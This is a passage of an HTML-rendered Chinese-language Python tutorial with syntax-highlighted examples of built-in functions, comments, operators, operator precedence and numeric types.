punctuation">,</span> list2<span class="token punctuation">)</span><span class="token comment"># 列表元素 :  ['H', 'e', 'l', 'l', 'o', ' ', 'W', 'o', 'r', 'l', 'd']</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="class-set-iterable"><a href="#class-set-iterable" class="headerlink" title="class set([iterable])"></a><code>class set([iterable])</code></h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># set() 函数创建一个无序不重复元素集</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="class-dict-kwarg"><a href="#class-dict-kwarg" class="headerlink" title="class dict(**kwarg)"></a><code>class dict(**kwarg)</code></h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">'''class dict(**kwarg)class dict(mapping, **kwarg)class dict(iterable, **kwarg)创建一个字典'''</span><span class="token builtin">dict</span><span class="token punctuation">(</span>a<span class="token operator">=</span><span class="token string">'a'</span><span class="token punctuation">,</span> b<span class="token operator">=</span><span class="token string">'b'</span><span class="token punctuation">,</span> t<span class="token operator">=</span><span class="token string">'t'</span><span class="token punctuation">)</span>     <span class="token comment"># 传入关键字</span><span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token builtin">zip</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'one'</span><span class="token punctuation">,</span> <span class="token string">'two'</span><span class="token punctuation">,</span> <span class="token string">'three'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># 映射函数方式来构造字典</span><span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">'one'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'two'</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'three'</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment"># 可迭代对象方式来构造字典</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="class-frozenset-iterable"><a href="#class-frozenset-iterable" class="headerlink" title="class frozenset([iterable])"></a><code>class frozenset([iterable])</code></h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 返回一个冻结的集合，冻结后集合不能再添加或删除任何元素</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">frozenset</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="chr-i"><a href="#chr-i" class="headerlink" title="chr(i)"></a><code>chr(i)</code></h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 返回值是当前整数对应的 ASCII 字符</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#0</span><span class="token comment">#0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="ord-c"><a href="#ord-c" class="headerlink" title="ord(c)"></a><code>ord(c)</code></h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 返回对应的 ASCII 数值，或者 Unicode 数值</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#97</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="hex-x"><a href="#hex-x" class="headerlink" title="hex(x)"></a><code>hex(x)</code></h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 将10进制整数转换成16进制，以字符串形式表示</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#0x14</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="oct-x"><a href="#oct-x" class="headerlink" title="oct(x)"></a><code>oct(x)</code></h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 将一个整数转换成 8 进制字符串</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">oct</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#0o12</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="注释-1"><a href="#注释-1" class="headerlink" title="注释"></a>注释</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 单行注释</span><span class="token triple-quoted-string string">'''多行注释'''</span><span class="token triple-quoted-string string">"""多行注释"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><h3 id="算数运算符"><a href="#算数运算符" class="headerlink" title="算数运算符"></a>算数运算符</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">a <span class="token operator">=</span> <span class="token number">4</span>b <span class="token operator">=</span> <span class="token number">3</span>c <span class="token operator">=</span> <span class="token number">0</span>c <span class="token operator">=</span> a <span class="token operator">+</span> b<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c 的值为："</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token comment"># 7</span>c <span class="token operator">=</span> a <span class="token operator">-</span> b<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c 的值为："</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token comment"># 1</span>c <span class="token operator">=</span> a <span class="token operator">*</span> b<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c 的值为："</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token comment"># 12</span>c <span class="token operator">=</span> a <span class="token operator">/</span> b<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c 的值为："</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token comment"># 1.3333333333333333</span>c <span class="token operator">=</span> a <span class="token operator">%</span> b<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c 的值为："</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token comment"># 1</span>a <span class="token operator">=</span> <span class="token number">4</span>b <span class="token operator">=</span> <span class="token number">3</span>c <span class="token operator">=</span> a <span class="token operator">**</span> b  <span class="token comment"># 乘方</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c 的值为："</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token comment"># 64</span>a <span class="token operator">=</span> <span class="token number">10</span>b <span class="token operator">=</span> <span class="token number">5</span>c <span class="token operator">=</span> a <span class="token operator">//</span> b  <span class="token comment"># 取整除</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c 的值为："</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token comment"># 2</span><span class="token triple-quoted-string string">'''c 的值为： 7c 的值为： 1c 的值为： 12c 的值为： 1.3333333333333333c 的值为： 1c 的值为： 64c 的值为： 2'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">a <span class="token operator">=</span> <span class="token number">21</span>b <span class="token operator">=</span> <span class="token number">10</span>c <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">==</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"a 等于 b"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"a 不等于 b"</span><span class="token punctuation">)</span><span class="token comment"># a 不等于 b</span><span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">!=</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"a 不等于 b"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"a 等于 b"</span><span class="token punctuation">)</span><span class="token comment"># a 不等于 b</span><span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">&lt;</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"a 小于 b"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"a 大于等于 b"</span><span class="token punctuation">)</span><span class="token comment"># a 大于等于 b</span><span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">&gt;</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"a 大于 b"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"a 小于等于 b"</span><span class="token punctuation">)</span><span class="token comment"># a 大于 b</span><span class="token comment"># 修改变量 a 和 b 的值</span>a <span class="token operator">=</span> <span class="token number">5</span>b <span class="token operator">=</span> <span class="token number">20</span><span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">&lt;=</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"a 小于等于 b"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"a 大于  b"</span><span class="token punctuation">)</span><span class="token comment"># a 小于等于 b</span><span class="token keyword">if</span> <span class="token punctuation">(</span>b <span class="token operator">&gt;=</span> a<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"b 大于等于 a"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"b 小于 a"</span><span class="token punctuation">)</span><span class="token comment"># b 大于等于 a    </span><span class="token triple-quoted-string string">'''a 不等于 ba 不等于 ba 大于等于 ba 大于 ba 小于等于 bb 大于等于 a'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">a <span class="token operator">=</span> <span class="token number">21</span>b <span class="token operator">=</span> <span class="token number">10</span>c <span class="token operator">=</span> <span class="token number">0</span>c <span class="token operator">=</span> a <span class="token operator">+</span> b<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c 的值为："</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token comment"># 31</span>c <span class="token operator">+=</span> a<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c 的值为："</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token comment"># 52</span>c <span class="token operator">*=</span> a<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c 的值为："</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token comment"># 1092</span>c <span class="token operator">/=</span> a<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c 的值为："</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token comment"># 52.0</span>c <span class="token operator">=</span> <span class="token number">2</span>c <span class="token operator">%=</span> a<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c 的值为："</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token comment"># 2</span>c <span class="token operator">**=</span> a<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c 的值为："</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token comment"># 2097152</span>c <span class="token operator">//=</span> a<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c 的值为："</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token comment"># 99864</span><span class="token triple-quoted-string string">'''c 的值为： 31c 的值为： 52c 的值为： 1092c 的值为： 52.0c 的值为： 2c 的值为： 2097152c 的值为： 99864'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">a <span class="token operator">=</span> <span class="token number">60</span>  <span class="token comment"># 60 = 0011 1100</span>b <span class="token operator">=</span> <span class="token number">13</span>  <span class="token comment"># 13 = 0000 1101</span>c <span class="token operator">=</span> <span class="token number">0</span>c <span class="token operator">=</span> a <span class="token operator">&amp;</span> b  <span class="token comment"># 12 = 0000 1100</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c 的值为："</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token comment"># 12</span>c <span class="token operator">=</span> a <span class="token operator">|</span> b  <span class="token comment"># 61 = 0011 1101</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c 的值为："</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token comment"># 61</span>c <span class="token operator">=</span> a <span class="token operator">^</span> b  <span class="token comment"># 49 = 0011 0001</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c 的值为："</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token comment"># 49</span>c <span class="token operator">=</span> <span class="token operator">~</span>a  <span class="token comment"># -61 = 1100 0011</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c 的值为："</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token comment"># -61</span>c <span class="token operator">=</span> a <span class="token operator">&lt;&lt;</span> <span class="token number">2</span>  <span class="token comment"># 240 = 1111 0000</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c 的值为："</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token comment"># 240</span>c <span class="token operator">=</span> a <span class="token operator">&gt;&gt;</span> <span class="token number">2</span>  <span class="token comment"># 15 = 0000 1111</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c 的值为："</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token comment"># 15</span><span class="token triple-quoted-string string">'''c 的值为： 12c 的值为： 61c 的值为： 49c 的值为： -61c 的值为： 240c 的值为： 15'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">a <span class="token operator">=</span> <span class="token number">10</span>b <span class="token operator">=</span> <span class="token number">20</span><span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token keyword">and</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"变量 a 和 b 都为 true"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"变量 a 和 b 有一个不为 true"</span><span class="token punctuation">)</span><span class="token comment"># 变量 a 和 b 都为 true</span><span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token keyword">or</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"变量 a 和 b 都为 true，或其中一个变量为 true"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"变量 a 和 b 都不为 true"</span><span class="token punctuation">)</span><span class="token comment"># 变量 a 和 b 都为 true，或其中一个变量为 true</span><span class="token comment"># 修改变量 a 的值</span>a <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token keyword">and</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"变量 a 和 b 都为 true"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"变量 a 和 b 有一个不为 true"</span><span class="token punctuation">)</span><span class="token comment"># 变量 a 和 b 有一个不为 true</span><span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token keyword">or</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"变量 a 和 b 都为 true，或其中一个变量为 true"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"变量 a 和 b 都不为 true"</span><span class="token punctuation">)</span><span class="token comment"># 变量 a 和 b 都为 true，或其中一个变量为 true</span><span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token punctuation">(</span>a <span class="token keyword">and</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"变量 a 和 b 都为 false，或其中一个变量为 false"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"变量 a 和 b 都为 true"</span><span class="token punctuation">)</span><span class="token comment"># 变量 a 和 b 都为 false，或其中一个变量为 false    </span><span class="token triple-quoted-string string">'''变量 a 和 b 都为 true变量 a 和 b 都为 true，或其中一个变量为 true变量 a 和 b 有一个不为 true变量 a 和 b 都为 true，或其中一个变量为 true变量 a 和 b 都为 false，或其中一个变量为 false'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="成员运算符"><a href="#成员运算符" class="headerlink" title="成员运算符"></a>成员运算符</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">a <span class="token operator">=</span> <span class="token number">10</span>b <span class="token operator">=</span> <span class="token number">20</span><span class="token builtin">list</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token keyword">in</span> <span class="token builtin">list</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"变量 a 在给定的列表中 list 中"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"变量 a 不在给定的列表中 list 中"</span><span class="token punctuation">)</span><span class="token comment"># 变量 a 不在给定的列表中 list 中</span><span class="token keyword">if</span> <span class="token punctuation">(</span>b <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token builtin">list</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"变量 b 不在给定的列表中 list 中"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"变量 b 在给定的列表中 list 中"</span><span class="token punctuation">)</span><span class="token comment"># 变量 b 不在给定的列表中 list 中</span><span class="token comment"># 修改变量 a 的值</span>a <span class="token operator">=</span> <span class="token number">2</span><span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token keyword">in</span> <span class="token builtin">list</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"变量 a 在给定的列表中 list 中"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"变量 a 不在给定的列表中 list 中"</span><span class="token punctuation">)</span><span class="token comment"># 变量 a 在给定的列表中 list 中</span><span class="token triple-quoted-string string">'''变量 a 不在给定的列表中 list 中变量 b 不在给定的列表中 list 中变量 a 在给定的列表中 list 中'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="身份运算符"><a href="#身份运算符" class="headerlink" title="身份运算符"></a>身份运算符</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">a <span class="token operator">=</span> <span class="token number">20</span>b <span class="token operator">=</span> <span class="token number">20</span><span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token keyword">is</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"a 和 b 有相同的标识"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"a 和 b 没有相同的标识"</span><span class="token punctuation">)</span><span class="token comment"># a 和 b 有相同的标识</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">id</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"a 和 b 有相同的标识"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"a 和 b 没有相同的标识"</span><span class="token punctuation">)</span><span class="token comment"># a 和 b 有相同的标识</span><span class="token comment"># 修改变量 b 的值</span>b <span class="token operator">=</span> <span class="token number">30</span><span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token keyword">is</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"a 和 b 有相同的标识"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"a 和 b 没有相同的标识"</span><span class="token punctuation">)</span><span class="token comment"># a 和 b 没有相同的标识</span><span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token keyword">is</span> <span class="token keyword">not</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"a 和 b 没有相同的标识"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"a 和 b 有相同的标识"</span><span class="token punctuation">)</span><span class="token comment"># a 和 b 没有相同的标识    </span><span class="token triple-quoted-string string">'''a 和 b 有相同的标识a 和 b 有相同的标识a 和 b 没有相同的标识a 和 b 没有相同的标识'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="优先级"><a href="#优先级" class="headerlink" title="优先级"></a>优先级</h3><table><thead><tr><th align="left">运算符</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">**</td><td align="left">指数 (最高优先级)</td></tr><tr><td align="left">~ + -</td><td align="left">按位翻转, 一元加号和减号 (最后两个的方法名为 +@ 和 -@)</td></tr><tr><td align="left">* / % //</td><td align="left">乘，除，求余数和取整除</td></tr><tr><td align="left">+ -</td><td align="left">加法减法</td></tr><tr><td align="left">&gt;&gt; &lt;&lt;</td><td align="left">右移，左移运算符</td></tr><tr><td align="left">&amp;</td><td align="left">位 ‘AND’</td></tr><tr><td align="left">^ |</td><td align="left">位运算符</td></tr><tr><td align="left">&lt;= &lt; &gt; &gt;=</td><td align="left">比较运算符</td></tr><tr><td align="left">== !=</td><td align="left">等于运算符</td></tr><tr><td align="left">= %= /= //= -= += *= **=</td><td align="left">赋值运算符</td></tr><tr><td align="left">is is not</td><td align="left">身份运算符</td></tr><tr><td align="left">in not in</td><td align="left">成员运算符</td></tr><tr><td align="left">not and or</td><td align="left">逻辑运算符</td></tr></tbody></table><h2 id="数字-Number"><a href="#数字-Number" class="headerlink" title="数字(Number)"></a>数字(Number)</h2><p>直接创建，不用特别定义类型</p><p>支持int、float、bool、complex（复数）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">var <span class="token operator">=</span> <span class="token number">1</span>var1 <span class="token operator">=</span> <span class="token string">'test'</span><span class="token keyword">print</span><span class="token punctuation">(</span>var<span class="token punctuation">,</span> var1<span class="token punctuation">)</span><span class="token comment"># 1 test</span><span class="token keyword">del</span> var<span class="token punctuation">,</span> var1 <span class="token comment"># 删除对象</span><span class="token comment"># 8或者16进制表示数字</span>var <span class="token operator">=</span> <span class="token number">0x99</span>var1 <span class="token operator">=</span> <span class="token number">0o43</span><span class="token keyword">print</span><span class="token punctuation">(</span>var<span class="token punctuation">,</span> var1<span class="token punctuation">)</span><span class="token comment"># 153 35</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="运算"><a href="#运算" class="headerlink" title="运算"></a>运算</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">3</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">6.3</span> <span class="token operator">/</span> <span class="token number">3</span><span class="token punctuation">)</span>  <span class="token comment"># 与浮点数运算结果为浮点数</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">3</span> <span class="token operator">**</span> <span class="token number">2</span><span class="token punctuation">)</span>  <span class="token comment"># 乘方</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">6.5</span> <span class="token operator">//</span> <span class="token number">3</span><span class="token punctuation">)</span>  <span class="token comment"># 向下取整</span>var <span class="token operator">=</span> <span class="token string">'test'</span>  <span class="token comment"># 赋值</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">7</span> <span class="token operator">%</span> <span class="token number">3</span><span class="token punctuation">)</span>  <span class="token comment"># 取余</span><span class="token number">3</span> <span class="token operator">*</span> <span class="token number">3</span><span class="token keyword">print</span><span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token comment"># 变量_是上一个表达式的值</span><span 